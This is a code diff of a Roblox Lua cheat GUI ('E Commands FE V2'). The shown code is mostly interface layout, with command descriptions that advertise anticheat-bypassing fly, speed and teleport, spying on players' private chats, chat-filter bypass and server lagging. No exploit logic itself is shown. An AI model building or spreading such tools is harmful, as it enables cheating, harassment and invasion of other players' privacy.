-Converted["_cmd16"].TextWrapped = true
-Converted["_cmd16"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd16"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd16"].BackgroundTransparency = 1
-Converted["_cmd16"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd16"].ZIndex = 999999999
-Converted["_cmd16"].Name = "cmd"
-Converted["_cmd16"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info16"].Value = "Command Info: Makes someones radio sound weird and glitchy. (extra info once executed in output box)"
-Converted["_Info16"].Name = "Info"
-Converted["_Info16"].Parent = Converted["_cmd16"]
-
-Converted["_cmd17"].Font = Enum.Font.FredokaOne
-Converted["_cmd17"].Text = " >audiologs"
-Converted["_cmd17"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd17"].TextScaled = true
-Converted["_cmd17"].TextSize = 14
-Converted["_cmd17"].TextWrapped = true
-Converted["_cmd17"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd17"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd17"].BackgroundTransparency = 1
-Converted["_cmd17"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd17"].ZIndex = 999999999
-Converted["_cmd17"].Name = "cmd"
-Converted["_cmd17"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info17"].Value = "Command Info: Executes an Audio Logger. (probably old idk)"
-Converted["_Info17"].Name = "Info"
-Converted["_Info17"].Parent = Converted["_cmd17"]
-
-Converted["_cmd18"].Font = Enum.Font.FredokaOne
-Converted["_cmd18"].Text = " >bdexe"
-Converted["_cmd18"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd18"].TextScaled = true
-Converted["_cmd18"].TextSize = 14
-Converted["_cmd18"].TextWrapped = true
-Converted["_cmd18"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd18"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd18"].BackgroundTransparency = 1
-Converted["_cmd18"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd18"].ZIndex = 999999999
-Converted["_cmd18"].Name = "cmd"
-Converted["_cmd18"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info18"].Value = "Command Info: This doesnt execute no logs version anymore since pastebin deleted my account for no reason and now I have to give normal but the logs are removed by the devs so your fine. (they were game logs anyways)"
-Converted["_Info18"].Name = "Info"
-Converted["_Info18"].Parent = Converted["_cmd18"]
-
-Converted["_cmd19"].Font = Enum.Font.FredokaOne
-Converted["_cmd19"].Text = " >frakturess"
-Converted["_cmd19"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd19"].TextScaled = true
-Converted["_cmd19"].TextSize = 14
-Converted["_cmd19"].TextWrapped = true
-Converted["_cmd19"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd19"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd19"].BackgroundTransparency = 1
-Converted["_cmd19"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd19"].ZIndex = 999999999
-Converted["_cmd19"].Name = "cmd"
-Converted["_cmd19"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info19"].Value = "Command Info: Executes Frakture SS. (backdoor scanner) (idk if this is discontinued honestly)"
-Converted["_Info19"].Name = "Info"
-Converted["_Info19"].Parent = Converted["_cmd19"]
-
-Converted["_cmd20"].Font = Enum.Font.FredokaOne
-Converted["_cmd20"].Text = " >chatbot"
-Converted["_cmd20"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd20"].TextScaled = true
-Converted["_cmd20"].TextSize = 14
-Converted["_cmd20"].TextWrapped = true
-Converted["_cmd20"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd20"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd20"].BackgroundTransparency = 1
-Converted["_cmd20"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd20"].ZIndex = 999999999
-Converted["_cmd20"].Name = "cmd"
-Converted["_cmd20"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info20"].Value = "Command Info: Use a new Chat Bot thing so it works now."
-Converted["_Info20"].Name = "Info"
-Converted["_Info20"].Parent = Converted["_cmd20"]
-
-Converted["_cmd21"].Font = Enum.Font.FredokaOne
-Converted["_cmd21"].Text = " >antifling"
-Converted["_cmd21"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd21"].TextScaled = true
-Converted["_cmd21"].TextSize = 14
-Converted["_cmd21"].TextWrapped = true
-Converted["_cmd21"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd21"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd21"].BackgroundTransparency = 1
-Converted["_cmd21"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd21"].ZIndex = 999999999
-Converted["_cmd21"].Name = "cmd"
-Converted["_cmd21"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info21"].Value = "Command Info: An actually good Anti Fling."
-Converted["_Info21"].Name = "Info"
-Converted["_Info21"].Parent = Converted["_cmd21"]
-
-Converted["_cmd22"].Font = Enum.Font.FredokaOne
-Converted["_cmd22"].Text = " >to/<player name>"
-Converted["_cmd22"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd22"].TextScaled = true
-Converted["_cmd22"].TextSize = 14
-Converted["_cmd22"].TextWrapped = true
-Converted["_cmd22"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd22"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd22"].BackgroundTransparency = 1
-Converted["_cmd22"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd22"].ZIndex = 999999999
-Converted["_cmd22"].Name = "cmd"
-Converted["_cmd22"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info22"].Value = "Command Info: Teleports you to a player (in a way that bypasses most anti cheats)"
-Converted["_Info22"].Name = "Info"
-Converted["_Info22"].Parent = Converted["_cmd22"]
-
-Converted["_cmd23"].Font = Enum.Font.FredokaOne
-Converted["_cmd23"].Text = " >fly"
-Converted["_cmd23"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd23"].TextScaled = true
-Converted["_cmd23"].TextSize = 14
-Converted["_cmd23"].TextWrapped = true
-Converted["_cmd23"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd23"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd23"].BackgroundTransparency = 1
-Converted["_cmd23"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd23"].ZIndex = 999999999
-Converted["_cmd23"].Name = "cmd"
-Converted["_cmd23"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info23"].Value = "Command Info: Makes you fly in a way that bypasses most anti cheats. Controls: W,A,S,D,Q,E,LeftCtrl"
-Converted["_Info23"].Name = "Info"
-Converted["_Info23"].Parent = Converted["_cmd23"]
-
-Converted["_cmd24"].Font = Enum.Font.FredokaOne
-Converted["_cmd24"].Text = " >noclip"
-Converted["_cmd24"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd24"].TextScaled = true
-Converted["_cmd24"].TextSize = 14
-Converted["_cmd24"].TextWrapped = true
-Converted["_cmd24"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd24"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd24"].BackgroundTransparency = 1
-Converted["_cmd24"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd24"].ZIndex = 999999999
-Converted["_cmd24"].Name = "cmd"
-Converted["_cmd24"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info24"].Value = "Command Info: Let's you walk through walls and stuff."
-Converted["_Info24"].Name = "Info"
-Converted["_Info24"].Parent = Converted["_cmd24"]
-
-Converted["_cmd25"].Font = Enum.Font.FredokaOne
-Converted["_cmd25"].Text = " >clip"
-Converted["_cmd25"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd25"].TextScaled = true
-Converted["_cmd25"].TextSize = 14
-Converted["_cmd25"].TextWrapped = true
-Converted["_cmd25"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd25"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd25"].BackgroundTransparency = 1
-Converted["_cmd25"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd25"].ZIndex = 999999999
-Converted["_cmd25"].Name = "cmd"
-Converted["_cmd25"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info25"].Value = "Command Info: Turns off noclip."
-Converted["_Info25"].Name = "Info"
-Converted["_Info25"].Parent = Converted["_cmd25"]
-
-Converted["_cmd26"].Font = Enum.Font.FredokaOne
-Converted["_cmd26"].Text = " >speed/<number>"
-Converted["_cmd26"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd26"].TextScaled = true
-Converted["_cmd26"].TextSize = 14
-Converted["_cmd26"].TextWrapped = true
-Converted["_cmd26"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd26"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd26"].BackgroundTransparency = 1
-Converted["_cmd26"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd26"].ZIndex = 999999999
-Converted["_cmd26"].Name = "cmd"
-Converted["_cmd26"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info26"].Value = "Command Info: Let's you walk fast in a way that bypasses most anti cheats."
-Converted["_Info26"].Name = "Info"
-Converted["_Info26"].Parent = Converted["_cmd26"]
-
-Converted["_cmd27"].Font = Enum.Font.FredokaOne
-Converted["_cmd27"].Text = " >unspeed"
-Converted["_cmd27"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd27"].TextScaled = true
-Converted["_cmd27"].TextSize = 14
-Converted["_cmd27"].TextWrapped = true
-Converted["_cmd27"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd27"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd27"].BackgroundTransparency = 1
-Converted["_cmd27"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd27"].ZIndex = 999999999
-Converted["_cmd27"].Name = "cmd"
-Converted["_cmd27"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info27"].Value = "Command Info: turns off speed (because it can't be stopped normally)"
-Converted["_Info27"].Name = "Info"
-Converted["_Info27"].Parent = Converted["_cmd27"]
-
-Converted["_cmd28"].Font = Enum.Font.FredokaOne
-Converted["_cmd28"].Text = " >remotespy"
-Converted["_cmd28"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd28"].TextScaled = true
-Converted["_cmd28"].TextSize = 14
-Converted["_cmd28"].TextWrapped = true
-Converted["_cmd28"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd28"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd28"].BackgroundTransparency = 1
-Converted["_cmd28"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd28"].ZIndex = 999999999
-Converted["_cmd28"].Name = "cmd"
-Converted["_cmd28"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info28"].Value = "Command Info: Let's you see some remote event stuff"
-Converted["_Info28"].Name = "Info"
-Converted["_Info28"].Parent = Converted["_cmd28"]
-
-Converted["_cmd29"].Font = Enum.Font.FredokaOne
-Converted["_cmd29"].Text = " >chatbypass"
-Converted["_cmd29"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd29"].TextScaled = true
-Converted["_cmd29"].TextSize = 14
-Converted["_cmd29"].TextWrapped = true
-Converted["_cmd29"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd29"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd29"].BackgroundTransparency = 1
-Converted["_cmd29"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd29"].ZIndex = 999999999
-Converted["_cmd29"].Name = "cmd"
-Converted["_cmd29"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info29"].Value = "Command Info: The best chat bypasser honestly for me. (BetterBypasser) (may only for for new chat idk)"
-Converted["_Info29"].Name = "Info"
-Converted["_Info29"].Parent = Converted["_cmd29"]
-
-Converted["_cmd30"].Font = Enum.Font.FredokaOne
-Converted["_cmd30"].Text = " >collisions"
-Converted["_cmd30"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd30"].TextScaled = true
-Converted["_cmd30"].TextSize = 14
-Converted["_cmd30"].TextWrapped = true
-Converted["_cmd30"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd30"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd30"].BackgroundTransparency = 1
-Converted["_cmd30"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd30"].ZIndex = 999999999
-Converted["_cmd30"].Name = "cmd"
-Converted["_cmd30"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info30"].Value = "Command Info: Makes you able to walk on people in non collision games. (Fling scripts don't work though.)"
-Converted["_Info30"].Name = "Info"
-Converted["_Info30"].Parent = Converted["_cmd30"]
-
-Converted["_cmd31"].Font = Enum.Font.FredokaOne
-Converted["_cmd31"].Text = " >laggame"
-Converted["_cmd31"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd31"].TextScaled = true
-Converted["_cmd31"].TextSize = 14
-Converted["_cmd31"].TextWrapped = true
-Converted["_cmd31"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd31"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd31"].BackgroundTransparency = 1
-Converted["_cmd31"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd31"].ZIndex = 999999999
-Converted["_cmd31"].Name = "cmd"
-Converted["_cmd31"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info31"].Value = "Command Info: Lags the game using chat. Protects you from the lag though. (It's patched but I'm too lazy to remove it)"
-Converted["_Info31"].Name = "Info"
-Converted["_Info31"].Parent = Converted["_cmd31"]
-
-Converted["_cmd32"].Font = Enum.Font.FredokaOne
-Converted["_cmd32"].Text = " >brookhaven"
-Converted["_cmd32"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd32"].TextScaled = true
-Converted["_cmd32"].TextSize = 14
-Converted["_cmd32"].TextWrapped = true
-Converted["_cmd32"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd32"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd32"].BackgroundTransparency = 1
-Converted["_cmd32"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd32"].ZIndex = 999999999
-Converted["_cmd32"].Name = "cmd"
-Converted["_cmd32"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info32"].Value = "Command Info: Brookhaven trolling script."
-Converted["_Info32"].Name = "Info"
-Converted["_Info32"].Parent = Converted["_cmd32"]
-
-Converted["_cmd33"].Font = Enum.Font.FredokaOne
-Converted["_cmd33"].Text = " >btools"
-Converted["_cmd33"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd33"].TextScaled = true
-Converted["_cmd33"].TextSize = 14
-Converted["_cmd33"].TextWrapped = true
-Converted["_cmd33"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd33"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd33"].BackgroundTransparency = 1
-Converted["_cmd33"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd33"].ZIndex = 999999999
-Converted["_cmd33"].Name = "cmd"
-Converted["_cmd33"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info33"].Value = "Command Info: Btools V5 by rouxhaver."
-Converted["_Info33"].Name = "Info"
-Converted["_Info33"].Parent = Converted["_cmd33"]
-
-Converted["_cmd34"].Font = Enum.Font.FredokaOne
-Converted["_cmd34"].Text = " >emojichat"
-Converted["_cmd34"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd34"].TextScaled = true
-Converted["_cmd34"].TextSize = 14
-Converted["_cmd34"].TextWrapped = true
-Converted["_cmd34"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd34"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd34"].BackgroundTransparency = 1
-Converted["_cmd34"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd34"].ZIndex = 999999999
-Converted["_cmd34"].Name = "cmd"
-Converted["_cmd34"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info34"].Value = "Command Info: Let's you do emojis in chat using : (new chat has this feature but this is for legacy chat)"
-Converted["_Info34"].Name = "Info"
-Converted["_Info34"].Parent = Converted["_cmd34"]
-
-Converted["_cmd35"].Font = Enum.Font.FredokaOne
-Converted["_cmd35"].Text = " >vghub"
-Converted["_cmd35"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd35"].TextScaled = true
-Converted["_cmd35"].TextSize = 14
-Converted["_cmd35"].TextWrapped = true
-Converted["_cmd35"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd35"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd35"].BackgroundTransparency = 1
-Converted["_cmd35"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd35"].ZIndex = 999999999
-Converted["_cmd35"].Name = "cmd"
-Converted["_cmd35"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info35"].Value = "Command Info: A script hub with a lot of games."
-Converted["_Info35"].Name = "Info"
-Converted["_Info35"].Parent = Converted["_cmd35"]
-
-Converted["_cmd36"].Font = Enum.Font.FredokaOne
-Converted["_cmd36"].Text = " >scpfuturistic"
-Converted["_cmd36"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd36"].TextScaled = true
-Converted["_cmd36"].TextSize = 14
-Converted["_cmd36"].TextWrapped = true
-Converted["_cmd36"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd36"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd36"].BackgroundTransparency = 1
-Converted["_cmd36"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd36"].ZIndex = 999999999
-Converted["_cmd36"].Name = "cmd"
-Converted["_cmd36"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info36"].Value = "Command Info: Newest version of SCP Futuristic gui I made since I updated it."
-Converted["_Info36"].Name = "Info"
-Converted["_Info36"].Parent = Converted["_cmd36"]
-
-Converted["_cmd37"].Font = Enum.Font.FredokaOne
-Converted["_cmd37"].Text = " >togglekillbricks"
-Converted["_cmd37"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd37"].TextScaled = true
-Converted["_cmd37"].TextSize = 14
-Converted["_cmd37"].TextWrapped = true
-Converted["_cmd37"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd37"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd37"].BackgroundTransparency = 1
-Converted["_cmd37"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd37"].ZIndex = 999999999
-Converted["_cmd37"].Name = "cmd"
-Converted["_cmd37"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info37"].Value = "Command Info: Makes kill bricks not kill you. Press Z to toggle."
-Converted["_Info37"].Name = "Info"
-Converted["_Info37"].Parent = Converted["_cmd37"]
-
-Converted["_cmd38"].Font = Enum.Font.FredokaOne
-Converted["_cmd38"].Text = " >doorsgui"
-Converted["_cmd38"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd38"].TextScaled = true
-Converted["_cmd38"].TextSize = 14
-Converted["_cmd38"].TextWrapped = true
-Converted["_cmd38"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd38"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd38"].BackgroundTransparency = 1
-Converted["_cmd38"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd38"].ZIndex = 999999999
-Converted["_cmd38"].Name = "cmd"
-Converted["_cmd38"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info38"].Value = "Command Info: Not MSDoors anymore but I may add a differengt doors gui here that doesnt use keys systems if I can find one"
-Converted["_Info38"].Name = "Info"
-Converted["_Info38"].Parent = Converted["_cmd38"]
-
-Converted["_cmd39"].Font = Enum.Font.FredokaOne
-Converted["_cmd39"].Text = " >chatspy"
-Converted["_cmd39"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd39"].TextScaled = true
-Converted["_cmd39"].TextSize = 14
-Converted["_cmd39"].TextWrapped = true
-Converted["_cmd39"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd39"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd39"].BackgroundTransparency = 1
-Converted["_cmd39"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd39"].ZIndex = 999999999
-Converted["_cmd39"].Name = "cmd"
-Converted["_cmd39"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info39"].Value = "Command Info: Let's you spy on peoples private chats. (only for legacy chat but the >chatbypass command also has a chat spy which works for new chat)"
-Converted["_Info39"].Name = "Info"
-Converted["_Info39"].Parent = Converted["_cmd39"]
-
-Converted["_cmd40"].Font = Enum.Font.FredokaOne
-Converted["_cmd40"].Text = " >translator"
-Converted["_cmd40"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd40"].TextScaled = true
-Converted["_cmd40"].TextSize = 14
-Converted["_cmd40"].TextWrapped = true
-Converted["_cmd40"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd40"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd40"].BackgroundTransparency = 1
-Converted["_cmd40"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd40"].ZIndex = 999999999
-Converted["_cmd40"].Name = "cmd"
-Converted["_cmd40"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info40"].Value = "Command Info: Lets you translate peoples chats. Click on a message to translate. May need to choose the language you think it is. Quote to toggle GUI, Enter to Send. (legacy chat only)"
-Converted["_Info40"].Name = "Info"
-Converted["_Info40"].Parent = Converted["_cmd40"]
-
-Converted["_cmd41"].Font = Enum.Font.FredokaOne
-Converted["_cmd41"].Text = " >invis"
-Converted["_cmd41"].TextColor3 = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_cmd41"].TextScaled = true
-Converted["_cmd41"].TextSize = 14
-Converted["_cmd41"].TextWrapped = true
-Converted["_cmd41"].TextXAlignment = Enum.TextXAlignment.Left
-Converted["_cmd41"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Converted["_cmd41"].BackgroundTransparency = 1
-Converted["_cmd41"].Size = UDim2.new(0.922999978, 0, 0.00300000003, 0)
-Converted["_cmd41"].ZIndex = 999999999
-Converted["_cmd41"].Name = "cmd"
-Converted["_cmd41"].Parent = Converted["_CmdScroll"]
-
-Converted["_Info41"].Value = "Command Info: Togglable invisibility."
-Converted["_Info41"].Name = "Info"
-Converted["_Info41"].Parent = Converted["_cmd41"]
-
-Converted["_UICorner4"].Parent = Converted["_Frame"]
-
-Converted["_UIStroke2"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-Converted["_UIStroke2"].Color = Color3.fromRGB(0, 170.0000050663948, 255)
-Converted["_UIStroke2"].Parent = Converted["_Frame"]
-
--- Fake Module Scripts:
-
-local fake_module_scripts = {}
-
-
--- Fake Local Scripts:
-
-local function QGHWZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Dragify
-    local script = Instance.new("LocalScript")
-    script.Name = "Dragify"
-    script.Parent = Converted["_MainFrame"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local uidrag = Instance.new("UIDragDetector")
-	uidrag.Parent = script.Parent
-end
-local function FGJNAZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Main
-    local script = Instance.new("LocalScript")
-    script.Name = "Main"
-    script.Parent = Converted["_MainFrame"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
+-- E COMMANDS FE V2
+
+--[=[
+ d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
+88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
+88      88    88    88            odD'      88      88    88 88ooo88 
+88  ooo 88    88    88          .88'        88      88    88 88~~~88 
+88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
+ Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
+]=]
 
+-- Instances: 134 | Scripts: 2 | Modules: 0 | Tags: 0
+local G2L = {};
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh
+G2L["1"] = Instance.new("ScreenGui", gethui and gethui() or game:GetService("CoreGui"));
+G2L["1"]["DisplayOrder"] = 2147483647;
+G2L["1"]["Name"] = [[GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh]];
+G2L["1"]["ResetOnSpawn"] = false;
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["ZIndex"] = 2147483647;
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
+G2L["2"]["Size"] = UDim2.new(0.25199, 0, 0.1877, 0);
+G2L["2"]["Position"] = UDim2.new(0.74777, 0, 0.53332, 0);
+G2L["2"]["Name"] = [[MainFrame]];
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input
+G2L["3"] = Instance.new("TextBox", G2L["2"]);
+G2L["3"]["Name"] = [[Input]];
+G2L["3"]["PlaceholderColor3"] = Color3.fromRGB(0, 114, 167);
+G2L["3"]["ZIndex"] = 2147483647;
+G2L["3"]["BorderSizePixel"] = 0;
+G2L["3"]["TextWrapped"] = true;
+G2L["3"]["TextSize"] = 14;
+G2L["3"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["3"]["TextScaled"] = true;
+G2L["3"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
+G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["3"]["ClearTextOnFocus"] = false;
+G2L["3"]["PlaceholderText"] = [[E Commands - Put Command Here And Press Enter]];
+G2L["3"]["Size"] = UDim2.new(0.95253, 0, 0.30252, 0);
+G2L["3"]["Position"] = UDim2.new(0.02215, 0, 0.05882, 0);
+G2L["3"]["Text"] = [[]];
+G2L["3"]["BackgroundTransparency"] = 0.5;
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input.UICorner
+G2L["4"] = Instance.new("UICorner", G2L["3"]);
+
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Input.UIStroke
+G2L["5"] = Instance.new("UIStroke", G2L["3"]);
+G2L["5"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["5"]["Color"] = Color3.fromRGB(0, 171, 255);
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.UICorner
+G2L["6"] = Instance.new("UICorner", G2L["2"]);
+
+
+
+-- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.MainFrame.Line
+G2L["7"] = Instance.new("Frame", G2L["2"]);
+G2L["7"]["ZIndex"] = 2147483647;
+G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 171, 255);
+G2L["7"]["Size"] = UDim2.new(0.95253, 0, 0.01681, 0);
